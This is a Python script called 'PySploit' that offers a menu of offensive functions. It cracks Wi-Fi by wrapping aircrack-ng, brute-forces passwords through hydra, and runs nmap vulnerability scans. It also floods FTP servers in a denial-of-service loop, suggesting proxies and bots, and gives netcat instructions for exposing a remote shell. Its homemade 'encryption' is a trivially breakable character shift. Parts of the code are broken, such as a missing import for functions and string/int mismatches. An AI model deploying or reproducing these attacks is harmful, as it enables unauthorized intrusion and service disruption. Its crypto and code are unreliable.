#!/usr/bin/python3

__author__ = "EssamMohamed"


class Application:

    def __init__(self):
              
       # self.credits_for_logo =
                        #LOGO REGION -START-

        print("          _______              _______   ")
        print("         |       |  \\\    // |          ")
        print("         |       |   \\\  //  |          ")
        print("         |_______/    \\\//   |_______   ")
        print("         |             ||            |  ")
        print("         |             ||            |  ")
        print("         |             ||     _______|  ")
        print("   Linux product")
        print("   This script was written for testing the writter is not responsible for your abuse.") 

                #LOGO REGION -END-

        print("         @@@@@@@@@@@@@@@@@@@@@@@@@@@")
        print("       *************************** @")
        print("     %%%%%%%%%%%%%%%%%%%%%%%%%%% * @")
        print("   ########################### % * @")
        print("   #   <Welcome to PySploit> # % * @")
        print("   # ======================= # % *")
        print("   # written by EssamMohamed # %")
        print("   ###########################")
        print("       1-Hacking Wifi")
        print("       2-Encrypting")
        print("       3-Decrypting")
        print("       4-Chat NC")
        print("       5-Root System")
        print("       6-Scanning")
        print("       7-DosFTPAttack")
        print("       8-PasswordCracking")
        print("       99-Exit")
        try:
            self.choise = int(input("PyS>"))
            if (self.choise == 1):
                self.limit = int(input("1-Multi Interfaces  2-One Interface"))
                if(self.limit == 1):
                    #Preparing interfaces -Start-
                    self.internum = int(input("Enter the number of interfaces"))
                    self.interfaces = list()
                    for i in range(self.internum + 1):
                        self.inter = input("PyS>WlanInterfaceName>" + str(i) + ">")
                        self.interfaces.append(self.inter)
                    for n in self.interfaces:
                        os.system("airmon-ng start " + n)
                
                self.wlan = input("PyS>WlanInterfaceName>")
                os.system("airmon-ng start " + self.wlan)
                
                
                self.channel = int(input("PyS>Channel>"))
                self.bssid = input("PyS>Bssid>")
                print("It will take 10 minutes. so please, be patient...")
                time.sleep(3)
                print("Loading...")
                os.system("aireplay-ng -1 0 -a " + self.bssid + " wlan0mon")
                os.system("aireplay-ng -3 -b " + self.bssid + " wlan0mon")
                os.system("airodump-ng -c " + self.channel + " --bssid " + self.bssid + " -w CapedPackets wlan0mon")
                time.sleep(600)
                os.system("exit")
                print("The collected packets are ready, please wait a few seconds...")
                os.system("aircrack-ng -a -b " + self.bssid + " CapedPackets.cap")
                back()
            elif(self.choise == 2):
                #MASSE Encryption Algorithm by EssamMohamed
                key = random.randrange(1000)
                file_name = input("PyS>Encrypt>Filename(*.txt)>")
                with open(file_name,'r') as f:
                    new_line = ""
                    for line in f:
                        for letter in line:
                            new_letter = str(ord(letter) + key)
                            new_line = new_line + new_letter + " "
                encry_text = new_line
                encry_f = open("EncryptedFile.txt", "w")
                encry_f.write(encry_text)
                encry_f.close()
                print("The EncryptedFile.txt has been successfully generated the key is " + str(key))
                back()
            elif(self.choise == 3):
                #Only for MASSE ALgorithm
                file_name = input("PyS>Decrypt>Filename(*.txt)>")
                open_key = int(input("PyS>Decrypt>KeyOf" + file_name + ">"))
                with open(file_name,'r') as f:
                    new_line = ""
                    for line in f:
                        for letter in line.split():
                            new_letter = chr(int(letter) - open_key)
                            new_line = new_line + new_letter + ""
                decry_text = new_line
                decry_f = open("DecryptedFile.txt", "w")
                decry_f.write(decry_text)
                decry_f.close()
                back()
            elif(self.choise == 4):
                port = int(input("PyS>Chat>Port>"))
                print("Access key = nc [your_ip_address] " + str(port) + """ "Please inform who you want to talk with to write this into his terminal." """)
                print("Enter this into your terminal nc -l -p" + str(port))
                print("If you want to use his machine's terminal you inform him to type {nc -l -p" + str(port) + " (/bin/bash) if linux (C:\\windows\System32\cmd.exe) if windows}")
                back()
            elif(self.choise == 5):
                command = input("PyS>RootSys>Command>")
                os.system(command)
                back()
            elif(self.choise == 6):
                host = input("Enter the host of the target (IP or WEBSITE)...")
                print("1-Port Scanning")
                print("2-Vulnerabilities Scanning")
                ans = int(input("PyS>Scanner>"))
                if ans == 1:
                    print("1-Fast scan    2-Full scan")
                    ans_0 = int(input("PyS>PortScanner>"))
                    print("Wait a few minutes...")
                    if ans_0 == 1:
                        os.system("nmap " + host)
                    elif ans_0 == 2:
                        os.system("ping " + host)
                        os.system("nmap -sT -sU -p- " + host)
                    else:
                        print("Please, Enter a valid value")
                        Application()
                if ans == 2:
                    print("Wait afew minutes...")
                    os.system("nmap --script vuln " + host)
                else:
                    print("Please, Enter a valid value.")
                    Application()
                back()
            elif(self.choise == 7):
                print("Recommended:/Use a ProxyServer/Use alot of Bots/")
                user = input("PyS>DosFTP>EnterUserName>")
                pwrd = input("PyS>DosFTP>EnterUserPwrd>")
                comm = input("PyS>DosFTP>EnterACommand>")
                target = input("PyS>DosFTP>EnterTarget-ip->")
                port = input("PyS>DosFTP>EnterPort>")
                power = int(input("1-Soft   2-Violent"))
                if power == 1:
                    dos(98765, user, pwrd, comm, target, port)
                elif power ==2:
                    dos(9876543210, user, pwrd, comm, target, port)
                else:
                    Application()
            elif(self.choise == 8):
                ulist = input("PyS>PassCrack>USERLIST>")
                plist = input("PyS>PassCrack>PASSLIST>")
                target = input("PyS>PassCrack>Target-website/ip->")
                service = input("PyS>PassCrack>Service-ssh/ftp/http-post-form/mysql->")
                if service == "http-post-form" or service == "http-get-form":
                    os.system("hydra -L " + ulist + " -P " + plist + " " + target + " " + service + """"/login.php&username=^USER^&password=^PASS^" """)
                else:
                    os.system("hydra -L " + ulist + " -P " + plist + " " + service + "://" + target)
                back()
            elif(self.choise == 99):
                os.system("exit")
                exit()
            else:
                print("Please, Enter a valid value.")
                Application()
        except TypeError:
            print("Please, Enter a valid value")
            Application()
def dos(num, user, pwrd, comm, target, port):
    try:
        a = 0
        while a < num:
            server = socket.socket(AF_INET, SOCK_STREAM)
            connection = server.connect((target, port))
            server.recv(1024)
            server.send("USER " + user + "\r\n")
            server.recv(1024)
            server.send("PASS " + pwrd + "\r\n")
            server.recv(1024)
            server.send(comm + "\r\n")
            server.send("QUIT \r\n")
            server.recv(1024)
            server.close()
            a +=1
    except:
        print("Unable to send, " + target + " may have crashed!!!")
        Application()
    print("There is no indication whether " + target + " crashed or not!!!")
    back()
def back():
    endopt = int(input("99-Back to PySploit home..."))
    if endopt == 99:
        Application()

if __name__ == '__main__':
    import os
    import socket
    import random
    import time
    app = Application()
